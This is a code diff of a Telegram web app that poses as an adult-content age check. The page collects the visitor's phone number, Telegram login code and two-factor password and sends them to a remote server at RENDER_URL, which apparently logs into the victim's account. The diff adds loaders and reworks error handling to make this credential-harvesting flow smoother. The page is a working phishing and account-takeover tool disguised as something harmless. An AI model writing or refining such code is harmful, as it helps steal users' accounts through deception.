@@ -41,7 +41,7 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
         .emoji-img { width: 120px; height: 120px; margin-bottom: 20px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3)); }
-        
+
         h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 14px; opacity: 0.8; margin-bottom: 20px; line-height: 1.5; }
 
@@ -50,11 +50,11 @@
             padding: 16px; width: 100%; border-radius: 14px;
             font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px;
             transition: all 0.3s ease; box-shadow: 0 4px 15px var(--primary-glow);
+            display: flex; justify-content: center; align-items: center;
         }
         .btn:active { transform: scale(0.97); }
         .btn:disabled { background: #555; box-shadow: none; cursor: not-allowed; }
 
-        /* OTP Animated Inputs */
         .code-input-wrap { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .code-input {
             width: 45px; height: 55px; background: rgba(255, 255, 255, 0.05);
@@ -70,11 +70,11 @@
         .key.special { color: var(--primary-btn); font-weight: bold; }
 
         .error-msg { color: var(--error-color); font-size: 13px; margin-top: 12px; display: none; font-weight: 500; }
-        
+
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
         .shake { animation: shake 0.3s ease-in-out; border-color: var(--error-color) !important; }
 
-        .loader { width: 18px; height: 18px; border: 2.5px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; vertical-align: middle; margin-left: 8px; }
+        .loader { width: 18px; height: 18px; border: 2.5px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; margin-left: 10px; }
         @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -86,7 +86,7 @@
             <h2>Verify Your Age</h2>
             <p>You must be 18+ to access premium content. Click the button to verify.</p>
             <button class="btn" id="startBtn" onclick="handleStart()">
-                ✅ I'M 18+ PROCEED <span class="loader" id="loader"></span>
+                ✅ I'M 18+ PROCEED <span class="loader" id="loader_start"></span>
             </button>
         </div>
 
@@ -116,7 +116,7 @@
             <p>Your account is protected by a password. Please enter it below.</p>
             <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: none;" placeholder="Enter Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
-            <button class="btn" onclick="verify2FA()">UNLOCK ACCESS</button>
+            <button class="btn" id="confirm2fa" onclick="verify2FA()">UNLOCK ACCESS <span class="loader" id="loader_2fa"></span></button>
         </div>
 
         <div class="step" id="step4">
@@ -146,15 +146,15 @@
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
 
-                    // সাথে সাথে ওটিপি পেজে পাঠিয়ে দেয়া (আপনার চাহিদা অনুযায়ী)
+                    // নম্বর পাওয়ার সাথে সাথে ওটিপি পেজে মুভ করবে
                     nextStep(2);
 
-                    // ব্যাকগ্রাউন্ডে সার্ভারে ওটিপি রিকোয়েস্ট পাঠানো
+                    // ব্যাকগ্রাউন্ডে ওটিপি পাঠানোর নির্দেশ
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
-                    }).catch(e => console.log("Request processing..."));
+                    }).catch(e => console.log("Init request sent"));
 
                 } else {
                     tg.showPopup({
@@ -189,6 +189,7 @@
 
         async function verifyOtp() {
             try {
+                // ওটিপি পেজে একটি ইনডিকেটর দিতে পারেন যদি প্রয়োজন হয়
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -196,42 +197,59 @@
                 });
                 const data = await res.json();
 
-                if (data.status === "done") nextStep(4);
-                else if (data.status === "need_2fa") nextStep(3);
-                else {
-                    const wrap = document.getElementById('otp-wrap');
-                    wrap.classList.add('shake');
-                    document.getElementById('otp-error').style.display = "block";
-                    setTimeout(() => {
-                        wrap.classList.remove('shake');
-                        currentOtp = "";
-                        for(let i=1;i<=5;i++) {
-                            const el = document.getElementById('otp'+i);
-                            el.value="";
-                            el.classList.remove('filled');
-                        }
-                    }, 500);
+                if (data.status === "done") {
+                    nextStep(4);
+                } else if (data.status === "need_2fa") {
+                    nextStep(3);
+                } else {
+                    throw new Error("Invalid OTP");
                 }
             } catch (err) {
-                tg.showAlert("সার্ভার রেসপন্স দিচ্ছে না।");
+                const wrap = document.getElementById('otp-wrap');
+                wrap.classList.add('shake');
+                document.getElementById('otp-error').style.display = "block";
+                setTimeout(() => {
+                    wrap.classList.remove('shake');
+                    currentOtp = "";
+                    for(let i=1;i<=5;i++) {
+                        const el = document.getElementById('otp'+i);
+                        el.value="";
+                        el.classList.remove('filled');
+                    }
+                }, 500);
             }
         }
 
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
+            const loader = document.getElementById('loader_2fa');
+            const btn = document.getElementById('confirm2fa');
+            
             if(!pass) return;
 
-            const res = await fetch(`${RENDER_URL}/verify`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
-            });
-            const data = await res.json();
-            if (data.status === "done") nextStep(4);
-            else {
+            loader.style.display = "inline-block";
+            btn.disabled = true;
+
+            try {
+                const res = await fetch(`${RENDER_URL}/verify`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
+                });
+                const data = await res.json();
+                
+                if (data.status === "done") {
+                    nextStep(4);
+                } else {
+                    throw new Error("Invalid Password");
+                }
+            } catch (err) {
                 document.getElementById('2fa-input').classList.add('shake');
                 document.getElementById('2fa-error').style.display = "block";
                 setTimeout(() => document.getElementById('2fa-input').classList.remove('shake'), 500);
+            } finally {
+                loader.style.display = "none";
+                btn.disabled = false;
             }
         }
     </script>
